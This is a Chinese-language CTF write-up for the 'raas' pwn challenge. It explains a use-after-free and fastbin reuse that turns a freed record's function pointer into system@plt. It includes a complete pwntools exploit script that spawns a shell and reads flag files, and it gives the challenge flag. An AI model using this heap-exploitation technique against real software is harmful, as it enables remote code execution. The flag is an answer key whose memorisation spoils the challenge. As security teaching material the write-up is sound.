# PHM #69 Pwn — raas

| 項目 | 值 |
|:---|:---|
| 類別 | Pwn |
| 分數 | 160 |
| 保護 | Non-PIE / Canary ON / NX on / Partial RELRO (GOT 可寫) |
| Flag | `FLAG{M0m, 1 ju5t PwN3D a C1oud 5erv1ce!!}` |

## 題目

> `nc ctf.hackme.quest 7719`, Record-as-a-Service — 存 int / string record, menu-based.
>
> Binary: [`/static/raas`](https://ctf.hackme.quest/static/raas) (ELF 32-bit, 動態 link), Source: [`/static/raas.c`](https://ctf.hackme.quest/static/raas.c)

## 分析 — Analysis

### 關鍵漏洞

```c
struct record {
    void (*print)(struct record *);  // offset 0
    void (*free)(struct record *);   // offset 4
    union { int integer; char *string; };  // offset 8
};
struct record *records[16];

void rec_int_free(struct record *rec) { free(rec); puts("Record freed!"); }

void do_del() {
    int idx = ask("Index");
    records[idx]->free(records[idx]);   // ← no idx check, no clear after free
}
```

- `do_del` / `do_dump` **沒有 index 檢查** → 可以用任意 idx 包括已 free 過的
- `free()` 之後 **`records[idx]` 不清空** → UAF
- `do_new` 的 idx 檢查寫錯 (`> 16` 不是 `>= 16`) → 可寫 `records[16]` OOB
- `system` 已經 import 在 PLT (給 `cat tos.txt`), 不用 leak libc

### 攻擊 — Fastbin 疊字串到舊 record 的 chunk

sizeof(struct record) = 12 bytes → `malloc(12)` 回 24-byte chunk (fastbin[0x18]).

1. 建兩個 int rec (idx 0 → chunk A, idx 1 → chunk B)
2. 全部 del → fastbin head: **B → A** (LIFO)
3. 建一個 str rec idx=2 len=12:
   - `malloc(12)` 給 record → pop B, 蓋 vtable 在 B
   - `malloc(12)` 給 string → pop A ← **這塊 chunk `records[0]` 還指著!**
   - `fgets(string, 12, stdin)` 寫入 A 的內容
4. 此時 `records[0]` = A 的內容 = 我們 fgets 的 bytes:
   - `records[0]->print` = string[0..3]
   - `records[0]->free` = string[4..7]  ← **這個會被 del 呼叫**
   - `records[0]->string` = string[8..11]

### Payload

```
string[0..3] = "sh\x00\x00"      → records[0]->print  (不會被呼叫)
string[4..7] = p32(system@plt)   → records[0]->free   (被 do_del 呼叫)
string[8..10] = padding; fgets 補 \0 在 string[11]
```

`do_del(0)` 做 `records[0]->free(records[0])` = `system@plt(A)`. `system` 把 A 當 C 字串讀, 開頭是 `"sh\0"` → **`system("sh")` 開 shell**.

> [!IMPORTANT]
> 用 `do_del` 不用 `do_dump` 的原因: `print`/`free` 是 struct 內兩個不同 offset. 用 del 只呼叫 free, print 的 bytes 可以塞成 "sh\0\0" 給 system 當 shell 指令讀, 不用是 valid code pointer. 兩個限制分到兩個 offset 剛好繞過.

## 解法 — Exploit

```python
from pwn import process, remote, context, p32
import sys, time

context.log_level = 'error'; context.arch = 'i386'
REMOTE = len(sys.argv) > 1 and sys.argv[1] == 'remote'
SYSTEM_PLT = 0x080484f0

p = remote('ctf.hackme.quest', 7719) if REMOTE else process('./raas')

def menu(c):
    p.sendlineafter(b'Act > ', str(c).encode())
def new_int(i, v):
    menu(1); p.sendlineafter(b'Index > ', str(i).encode())
    p.sendlineafter(b'Type > ', b'1'); p.sendlineafter(b'Value > ', str(v).encode())
def new_str(i, l, c):
    menu(1); p.sendlineafter(b'Index > ', str(i).encode())
    p.sendlineafter(b'Type > ', b'2'); p.sendlineafter(b'Length > ', str(l).encode())
    p.sendafter(b'Value > ', c)
def delete(i):
    menu(2); p.sendlineafter(b'Index > ', str(i).encode())

new_int(0, 0); new_int(1, 0)        # chunk A, B
delete(0); delete(1)                 # fastbin: B -> A
new_str(2, 12, b'sh\x00\x00' + p32(SYSTEM_PLT) + b'\x00'*3)  # string lands on A
delete(0)                            # calls system("sh")

p.sendline(b'cat /home/*/flag*')
print(p.recv(timeout=3).decode(errors='replace'))
```

跑出來:

```
FLAG{M0m, 1 ju5t PwN3D a C1oud 5erv1ce!!}
```

## Sources

- [PHM scoreboard — raas](https://ctf.hackme.quest/scoreboard/?id=69)
- `/static/raas`, `/static/raas.c`
